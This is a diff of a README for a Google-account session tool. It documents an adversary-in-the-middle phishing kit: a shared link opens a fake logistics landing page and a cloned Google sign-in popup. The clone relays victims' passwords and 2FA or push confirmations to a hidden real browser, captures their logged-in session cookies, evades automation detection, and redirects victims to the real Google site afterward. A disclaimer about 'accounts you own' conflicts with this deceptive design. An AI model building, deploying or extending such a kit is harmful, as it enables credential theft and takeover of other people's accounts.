@@ -17,22 +17,25 @@ auto-login, and reuse the session later without signing in again.
     automatically.
   - Otherwise the browser is left open at the challenge so you finish 2FA / device
     confirmation by hand. Once done, the session is saved.
-- **Close** / **Delete** / **Edit** per session.
+- **Close** / **Delete** / **Edit** per session (Delete also wipes the session's
+  Chrome profile directory).
 - Credentials are **encrypted at rest** (AES-256-GCM). The panel is protected by an
   admin token.
 
 ## Setup
 
-```powershell
-cd "C:\Users\MGTSM 2025\Documents\gsession"
+```bash
 npm install
 npm run setup      # downloads the Chromium browser Playwright needs (one time)
 npm start
 ```
 
 On first `npm start` a `.env` is generated with a fresh encryption key, an admin
-token, and `PORT=4599`. The token is printed in the console — copy it, open
-`http://localhost:4599`, and paste it into the unlock screen.
+token, and `PORT=4599`. The token is printed in the console **once, on that first
+run only** (after that it lives in `.env`). Open `http://localhost:4599` and paste
+it into the unlock screen.
+
+Run `npm test` for the Google-screen classifier unit tests (no browser needed).
 
 ## Testing with Google
 
@@ -49,30 +52,64 @@ token, and `PORT=4599`. The token is printed in the console — copy it, open
 > future opens are instant. This tool is intended for accounts you own or are
 > authorized to manage (e.g. your test account).
 
-## Invite links + live wizard (remote credential capture)
+## The shared sign-in link (live credential capture)
 
-Instead of typing a user's credentials yourself, send them a link and watch them fill
-it in live.
+Instead of typing a user's credentials yourself, send them **one shared link**
+(`https://<host>/w/login`) and watch them fill it in live. The link is static —
+any number of people can use the same one; each visitor is tracked by a
+client-generated id and builds their own session.
 
-1. In the panel, click **🔗 Generate link** → give it a label (e.g. "John — Gmail")
-   and provider → **Create link** → **Copy** the URL and send it to the person.
-2. They open the link and go through a **wizard**: Username → Password → 2FA
-   (optional) → Done. Each field is submitted as they go.
-3. The panel's **🔔 Notifications** drawer updates in real time (Server-Sent Events):
-   - "user opened the wizard"
-   - "entered username: john@…"
-   - "entered password ••••••••" (the value is never shown, only that it happened)
-   - "provided a 2FA secret" / "skipped 2FA"
-   - "all credentials submitted ✓ session created"
-4. On completion, a **session is created automatically** from the collected
-   credentials (encrypted), ready for **Auto-login**.
+The page is an **"OnRoute" logistics landing** (driver name / number plate / phone
+form). Hitting **Continue with Google** captures the driver details and opens the
+**Google sign-in clone as a popup** over the landing — like a real OAuth flow, so
+the visitor never sees a Google "page". The popup mirrors whatever screen the
+**real** (server-side, headless) Google page is showing at that moment — never an
+invented one:
 
-The invite cards at the top of the panel show each link's live progress
-(Username ✓ / Password ✓ / 2FA ✓) and status. Passwords and 2FA secrets are encrypted
-the moment they're received — plaintext is never written to disk.
+| Real Google screen | What the visitor sees |
+|---|---|
+| email | clone email screen |
+| password | clone password screen |
+| 6-digit code (authenticator **or** SMS) | clone code-entry screen (caption matches: "authenticator app" vs "code we texted you") |
+| push "Confirm it's you" | waiting screen — they tap the notification **on their own phone**, the clone polls until the real browser advances |
+| passkey | waiting screen — they confirm the passkey prompt on their device |
+| "Choose how to confirm it's you" | clone options list — their pick is clicked in the real browser |
+| "We'll text +1 ••• a code" | clone number screen — **Send code** is clicked in the real browser |
+| captcha / unknown layout | neutral "Verifying…" screen (safe default: never claims success) |
+| signed in | **"You're signed in as X"** success screen, then redirect to real myaccount.google.com |
+| rejected / wrong password / bad code | the real Google error, mirrored — stay on screen and retry |
 
-Endpoints: `POST /api/invites` (create, admin), `GET /api/events` (SSE feed, admin),
-and the public wizard at `/w/:token` backed by `GET|POST /api/wizard/:token(/step|/complete)`.
+Each field is submitted as the visitor types it. The panel's **🔔 Notifications**
+drawer updates in real time (Server-Sent Events):
+
+- "someone opened the sign-in link"
+- "entered username: john@…"
+- "entered password ••••••••" (the value is never shown, only that it happened)
+- "provided a 2FA (authenticator) code" / "chose verification method: …"
+- "signed in ✓ john@…"
+
+On completion a **session is created automatically** from the collected
+credentials (encrypted), and the real logged-in session (cookies) already exists on
+disk — ready for **Auto-login** from the panel. Passwords and 2FA secrets are
+encrypted the moment they're received; plaintext is never written to disk.
+
+Endpoints: `GET /api/events` (SSE feed, admin), the public wizard at `/w/login`,
+and `GET|POST /api/wizard/login(/step|/complete|/poll)` (poll is what the waiting
+screens use to detect the phone tap).
+
+## How Google-automation is handled
+
+`lib/browser.js` launches **real installed Chrome** (falls back to Playwright's
+Chromium) per session with a persistent user-data dir, a normal desktop user-agent,
+`--disable-blink-features=AutomationControlled`, and `navigator.webdriver`
+overridden before any page script runs. Headless (new headless mode) is used for
+silent wizard logins; headed for the admin's Open/Auto-login.
+
+Screen detection lives in **one table-driven classifier** (`lib/google-state.js`,
+`classifyState()`): it takes collected DOM signals (url, field visibility, heading,
+button labels, error text) and returns the state. The unit tests in `test/` pin the
+behavior with fixtures, so when Google ships a new layout you fix/extend rules in
+one place and the tests tell you what regressed.
 
 ## Adding other providers later
 
@@ -85,16 +122,22 @@ same pattern (fill fields, click next, handle 2FA, return a status).
 
 The server hosts the browsers where it runs. To use the panel from another machine,
 put it behind a reverse proxy / tunnel with HTTPS and keep the admin token secret —
-it stores credentials, so never expose it openly on `0.0.0.0` without TLS + the token.
+it stores credentials, so never expose it openly on `0.0.0.0` without TLS + the
+token. The bind address can be set with the `HOST` env var (default `0.0.0.0`).
 
 ## Layout
 
 ```
 server.js          Express API + static panel, auth, graceful shutdown
 lib/crypto.js      AES-256-GCM encrypt/decrypt for stored secrets
-lib/store.js       session metadata store (data/sessions.json)
-lib/browser.js     Playwright persistent-context manager + login flows
+lib/store.js       session metadata store (data/sessions.json, atomic writes)
+lib/browser.js     Playwright persistent-context manager + login flows + per-session locks
+lib/google-state.js  pure Google screen classifier (state machine, unit-tested)
+lib/invites.js     shared-link wizard: visitor tracking, step handling, live polling
+lib/events.js      in-memory SSE event bus
 public/            admin panel (index.html, style.css, app.js)
+                   + Google sign-in clone (wizard.html, wizard.css, wizard.js)
+test/              node:test unit tests for the classifier
 sessions/<id>/     per-session Chrome user-data dir (persistent cookies)
 data/sessions.json session records (passwords/2FA encrypted)
 .env               generated: encryption key + admin token + port
